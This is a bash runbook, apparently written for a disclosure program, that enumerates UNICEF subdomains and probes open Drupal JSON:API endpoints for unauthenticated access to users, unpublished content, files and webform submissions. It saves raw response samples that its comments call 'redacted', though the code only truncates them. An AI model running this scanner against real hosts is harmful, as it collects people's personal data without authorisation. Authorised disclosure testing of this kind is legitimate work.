#!/usr/bin/env bash
# =============================================================================
# UNICEF VDP — Drupal JSON:API systemic exposure sweep (session2)
# Portable: Linux / Pi / Termux. curl + python3 only.
#
# Builds on F001 (ram.unicef.org JSON:API leaked 13,112 staff emails — SUBMITTED).
# Goal: find NEW exposures across the other ~10 Drupal instances + entity types
# F001 didn't cover — user PII on OTHER hosts, UNPUBLISHED content
# (?filter[status]=0), file/media metadata, and WEBFORM SUBMISSIONS (often real
# personal data) — plus the OAuth2 omitted-UUID leak.
#
# SAFETY (humanitarian org — non-negotiable):
#   - Max ~1 request/sec (program rule). Read-only GET only. No DoS/brute/automation-at-scale.
#   - SAMPLE ONLY: fetch page 1 / 1 record to CONFIRM EXISTENCE of an exposure.
#     NEVER bulk-paginate or exfiltrate. Counts come from meta, not by scraping.
#   - HARD STOP + flag (do NOT pull) on anything resembling beneficiary / child /
#     victim / missing-persons / health data. Skip known-sensitive hosts.
#   - Report only the misconfiguration + a minimal redacted sample.
#
# Run (Termux): OUTDIR=$HOME/un2 bash runbooks/PI-RUNBOOK-unicef-session2-jsonapi.sh \
#                 2>&1 | tee $HOME/un2/un2.log
# =============================================================================
set -o pipefail
if [ -z "${OUTDIR:-}" ]; then
  if [ -d /tmp ] && [ -w /tmp ]; then OUTDIR=/tmp/un2
  elif [ -n "${TMPDIR:-}" ] && [ -w "${TMPDIR}" ]; then OUTDIR="$TMPDIR/un2"
  else OUTDIR="$HOME/un2"; fi
fi
export OUTDIR; mkdir -p "$OUTDIR"
UA='Mozilla/5.0 (X11; Linux aarch64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
PACE="${PACE:-1.1}"   # seconds between requests (>=1/sec)
# Known/likely sensitive hosts to SKIP entirely (children/beneficiary/victim data)
SENSITIVE_RE='familylinks|casebook|missing|tracing|child|beneficiar|victim|health|patient|refugee|protection|gbv'

echo "============================================================"
echo "UNICEF JSON:API SWEEP  $(date -u '+%Y-%m-%dT%H:%M:%SZ')   IP: $(curl -s ifconfig.me)"
echo "Work: $OUTDIR   pace: ${PACE}s/req"
echo "SAFETY: sample-only, confirm-existence, hard-stop on beneficiary/child data"
echo "============================================================"; echo ""

# ── Phase A: enumerate subdomains (CT) ──
echo "═══ PHASE A: SUBDOMAIN ENUM (certspotter + wayback) ═══"
: > "$OUTDIR/subs.raw"
curl -s --max-time 30 -H "User-Agent: $UA" \
  "https://api.certspotter.com/v1/issuances?domain=unicef.org&include_subdomains=true&expand=dns_names" \
  2>/dev/null | grep -oE '[a-zA-Z0-9._-]+\.unicef\.org' >> "$OUTDIR/subs.raw" || true
curl -s --max-time 30 -H "User-Agent: $UA" \
  "http://web.archive.org/cdx/search/cdx?url=*.unicef.org&output=text&fl=original&collapse=urlkey&limit=5000" \
  2>/dev/null | sed -E 's#https?://##; s#/.*##; s/:.*//' | grep -E '\.unicef\.org$' >> "$OUTDIR/subs.raw" || true
grep -ivE "$SENSITIVE_RE" "$OUTDIR/subs.raw" | sort -u > "$OUTDIR/subs.txt"
SKIPPED=$(grep -icE "$SENSITIVE_RE" "$OUTDIR/subs.raw" || echo 0)
echo "  $(wc -l < "$OUTDIR/subs.txt") candidate hosts ($SKIPPED sensitive-named hosts SKIPPED)"
echo ""

# ── Phase B: find live Drupal + open /jsonapi ──
echo "═══ PHASE B: DETECT DRUPAL + OPEN /jsonapi ═══"
: > "$OUTDIR/jsonapi-hosts.txt"
n=0
while read -r H; do
  [ -z "$H" ] && continue
  n=$((n+1)); [ "$n" -gt "${MAXHOSTS:-400}" ] && break
  # quick liveness + Drupal hint
  hdr=$(curl -s -I --max-time 12 -H "User-Agent: $UA" "https://$H/" 2>/dev/null)
  echo "$hdr" | grep -qiE 'x-generator: *Drupal|x-drupal' && drupal=1 || drupal=0
  # probe /jsonapi
  body=$(curl -s --max-time 12 -H "User-Agent: $UA" -H 'Accept: application/vnd.api+json' "https://$H/jsonapi" 2>/dev/null)
  if echo "$body" | grep -q '"jsonapi"'; then
    echo "$H" >> "$OUTDIR/jsonapi-hosts.txt"
    echo "  *** JSON:API OPEN: https://$H/jsonapi"
  fi
  sleep "$PACE"
done < "$OUTDIR/subs.txt"
echo "  open JSON:API hosts: $(wc -l < "$OUTDIR/jsonapi-hosts.txt" 2>/dev/null || echo 0)"
echo ""

# ── Phase C: per-host entity exposure (SAMPLE ONLY) ──
echo "═══ PHASE C: ENTITY EXPOSURE (sample-only, F001 already covers ram user emails) ═══"
jget(){ curl -s --max-time 15 -H "User-Agent: $UA" -H 'Accept: application/vnd.api+json' "$1"; }
while read -r H; do
  [ -z "$H" ] && continue
  echo "  ── $H ──"
  base="https://$H/jsonapi"
  # 1) list resource types from the index
  idx=$(jget "$base"); sleep "$PACE"
  echo "$idx" | python3 - "$H" << 'PYEOF'
import sys,json
try: d=json.load(sys.stdin)
except Exception: sys.exit()
links=d.get("links",{})
types=[k for k in links if "--" in k]
print(f"    resource types advertised: {len(types)}")
# print the high-value ones present
hot=[t for t in types if any(x in t for x in ("user--","webform_submission","file--","media--","comment--","contact_message","node--"))]
print("    high-value present:", ", ".join(sorted(set(hot))[:20]) or "(none obvious)")
open(f"/tmp/_un_types_{sys.argv[1]}","w").write("\n".join(types))
PYEOF
  # 2) probe high-value endpoints (1 page, page-size 1) — confirm exposure only
  for EP in \
    "user/user?page[limit]=1" \
    "node/page?filter[status]=0&page[limit]=1" \
    "node/article?filter[status]=0&page[limit]=1" \
    "file/file?page[limit]=1" \
    "media/image?page[limit]=1" \
    "comment/comment?page[limit]=1" \
    "webform_submission/webform_submission?page[limit]=1" \
    "contact_message/feedback?page[limit]=1" ; do
    out=$(jget "$base/$EP"); code_has_data=$(echo "$out" | python3 -c "import sys,json
try:
  d=json.load(sys.stdin); dd=d.get('data')
  print('DATA' if dd else ('EMPTY' if dd==[] else 'OTHER'))
except Exception: print('ERR')" 2>/dev/null)
    # safety: bail if the record smells like beneficiary/child/health data
    if echo "$out" | grep -qiE 'beneficiar|child_|date_of_birth|dob|patient|diagnos|refugee|gbv|"ssn"|national_id'; then
      echo "    [SENSITIVE-LOOKING @ $EP] STOP — flag existence, NOT pulling. Manual careful review."
      echo "$H $EP SENSITIVE" >> "$OUTDIR/SENSITIVE-FLAGS.txt"
      continue
    fi
    if [ "$code_has_data" = "DATA" ]; then
      echo "    *** EXPOSED: /jsonapi/$EP  (returns data unauth)"
      echo "$H|$EP" >> "$OUTDIR/exposed.txt"
      # save a tiny redacted sample (first 400 chars) for evidence
      echo "$out" | head -c 400 > "$OUTDIR/sample-$(echo "$H$EP"|tr -c 'A-Za-z0-9' '_').json"
    fi
    sleep "$PACE"
  done
done < "$OUTDIR/jsonapi-hosts.txt"
echo ""

# ── Phase D: verdict ──
echo "════════════════════════════════════════════"
echo "FINDINGS (new exposures beyond F001/ram user emails)"
echo "════════════════════════════════════════════"
if [ -s "$OUTDIR/exposed.txt" ]; then
  sort -u "$OUTDIR/exposed.txt" | while IFS='|' read -r h ep; do
    echo "  * $h  ->  /jsonapi/$ep"
  done
  echo ""
  echo "  Triage each: user/* = PII (new host = new/ systemic finding); node ?status=0"
  echo "  = unpublished-content access bypass; webform_submission/contact_message ="
  echo "  form PII (HIGH if real); file/media = info leak. Confirm the sample is REAL"
  echo "  + sensitive, dedup vs F001 (ram user emails already reported), write report."
else
  echo "  No new unauth entity exposure on the open JSON:API hosts this pass."
fi
[ -s "$OUTDIR/SENSITIVE-FLAGS.txt" ] && { echo ""; echo "  !!! SENSITIVE-LOOKING endpoints flagged (review by hand, do NOT bulk-pull):"; cat "$OUTDIR/SENSITIVE-FLAGS.txt"|sed 's/^/    /'; }
echo ""
echo "Evidence: $OUTDIR (samples redacted, sample-only)"
echo "Run complete: $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
